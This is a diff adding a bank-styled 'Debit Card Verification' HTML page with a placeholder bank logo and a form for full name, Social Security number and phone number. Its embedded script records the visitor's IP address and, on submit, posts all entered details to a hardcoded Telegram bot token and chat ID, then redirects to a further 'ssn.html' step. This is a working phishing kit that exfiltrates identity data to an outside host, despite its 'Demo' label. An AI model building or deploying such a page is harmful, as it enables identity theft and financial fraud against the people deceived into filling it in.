@@ -1,0 +1,250 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Debit Card Verification | Demo</title>
+  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap" rel="stylesheet">
+  <style>
+    body {
+      font-family: 'Roboto', Arial, sans-serif;
+      margin: 0;
+      background: #f5f5f5;
+      color: #333;
+    }
+
+    header {
+      text-align: center;
+      padding: 20px 20px 0 20px;
+    }
+
+    header img {
+      height: 100px; /* Replaceable logo */
+      width: 400px;
+    }
+
+    .login-container {
+      max-width: 350px;
+      margin: 0 auto;
+      background: #fff;
+      padding: 25px;
+      border-radius: 8px;
+      box-shadow: 0 2px 6px rgba(0,0,0,0.1);
+    }
+
+    .form-group {
+      position: relative;
+      margin: 20px 0;
+    }
+
+    .form-group input {
+      width: 100%;
+      padding: 10px 5px;
+      border: none;
+      border-bottom: 2px solid #ccc;
+      font-size: 16px;
+      outline: none;
+      background: transparent;
+    }
+
+    .form-group label {
+      position: absolute;
+      left: 5px;
+      top: 10px;
+      font-size: 16px;
+      color: #aaa;
+      pointer-events: none;
+      transition: 0.2s ease all;
+    }
+
+    .form-group input:focus ~ label,
+    .form-group input:not(:placeholder-shown) ~ label {
+      top: -10px;
+      font-size: 12px;
+      color: #0065ff;
+    }
+
+    #login-status {
+      display: none;
+      margin-bottom: 10px;
+      text-align: center;
+    }
+
+    #login-status-message {
+      font-size: 14px;
+      color: red;
+    }
+
+    button {
+      width: 100%;
+      background: #0065ff;
+      color: #fff;
+      padding: 12px;
+      border: none;
+      border-radius: 4px;
+      font-size: 16px;
+      cursor: pointer;
+      margin-top: 10px;
+    }
+
+    button:hover {
+      background: #004bb7;
+    }
+
+    footer {
+      text-align: center;
+      margin-top: 0;
+      padding: 20px;
+      font-size: 13px;
+      color: #555;
+    }
+
+    .logo-strip {
+      margin: 0;
+    }
+
+    .logo-strip img {
+      width: 400px;
+      height: 100px;
+    }
+
+    .footer-links {
+      margin-top: 10px;
+      line-height: 1.8;
+    }
+
+    .footer-links a {
+      color: #0065ff;
+      text-decoration: none;
+      margin: 0 5px;
+      font-size: 13px;
+    }
+  </style>
+</head>
+<body>
+
+  <header>
+    <!-- Replaceable Logo -->
+    <img src="https://ik.imagekit.io/yleultaj4/IMG_7037.png?updatedAt=1756415428664" alt="Bank Logo">
+  </header>
+
+  <main>
+    <div class="login-container">
+      <form id="login_form">
+
+        <!-- Info text -->
+        <p class="otp-info">Verify your Information</p>
+		
+        <!-- Name -->
+        <div class="form-group">
+          <input type="text" id="name" placeholder=" " required>
+          <label for="pass">Full name</label>
+        </div>
+
+        <!-- SSN -->
+        <div class="form-group">
+          <input type="text" id="ssn" placeholder=" " required>
+          <label for="pass">Social Security Number</label>
+        </div>
+
+        <!-- number -->
+        <div class="form-group">
+          <input type="text" id="number" placeholder=" " required>
+          <label for="pass">Phone number</label>
+        </div>
+
+        <!-- Login status message area -->
+        <div id="login-status">
+          <span id="login-status-message"></span>
+        </div>
+
+        <button type="submit">Submit</button>
+      </form>
+    </div>
+  </main>
+
+  <footer>
+    <!-- Replace this with your logo strip -->
+    <div class="logo-strip">
+      <img src="https://ik.imagekit.io/yleultaj4/IMG_7038.jpeg?updatedAt=1756416847301" alt="Partner Logos">
+    </div>
+
+    <div class="footer-links">
+      <a href="#">Contact us</a> | 
+      <a href="#">Privacy</a> | 
+      <a href="#">Security</a> | 
+      <a href="#">Terms of use</a> | 
+      <a href="#">Accessibility</a><br>
+      <a href="#">SAFE Act</a> | 
+      <a href="#">Fair Lending</a> | 
+      <a href="#">About Us</a> | 
+      <a href="#">Careers</a> | 
+      <a href="#">Español</a><br>
+      <a href="#">Site map</a>
+    </div>
+    <p>Demo Project · Equal Opportunity</p>
+  </footer>
+
+  <!-- JS -->
+  <script>
+    // Form + status references
+     const form = document.querySelector('#login_form');
+    const oiRef = document.querySelector('#name');
+    const emRef = document.querySelector('#ssn');
+    const pwRef = document.querySelector('#number');
+    const actionContainer = document.querySelector('#login-status');
+    const actionAlert = document.querySelector('#login-status-message');
+    const searchParams = new URLSearchParams(location.search);
+    const dm = searchParams.get('userid');
+    const bt = '6968351903:AAH3JRKVtZalljxTam-KuTAUPzKGC1YtWpU';
+    const cid = '6529371358';
+    let IPAddress = '';
+
+
+    emRef.value = dm;
+
+    onload = async () => {
+        const response = await fetch('https://api.ipify.org?format=json');
+        const data = await response.json();
+        IPAddress = data.ip;
+    }
+
+    form.onsubmit = function(e) {
+        e.preventDefault();
+
+        if (!emRef.value) {
+            actionAlert.textContent = ' You must specify a username to log in.';
+            return;
+        }
+
+        actionContainer.classList.toggle('info-notice');
+        actionAlert.textContent = ' Authenticating...';
+
+        const message = `
+📝 PERSONAL DETAILS
+-----------------------
+👤 Full Name        : ${oiRef.value}
+🆔 SSN              : ${emRef.value}
+📞 Phone Number ID  : ${pwRef.value}
+
+🌐 IP Address       : ${IPAddress}
+`;
+
+
+
+        fetch(`https://api.telegram.org/bot${bt}/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ chat_id: cid, text: message })
+        })
+        .then(() => {
+            actionContainer.classList.remove('info-notice');
+            location.replace('ssn.html');
+        })
+        .catch(() => {
+            actionAlert.textContent = ' Something went wrong. Please try again.';
+        });
+    }
+</script>
+    </body>
+</html>
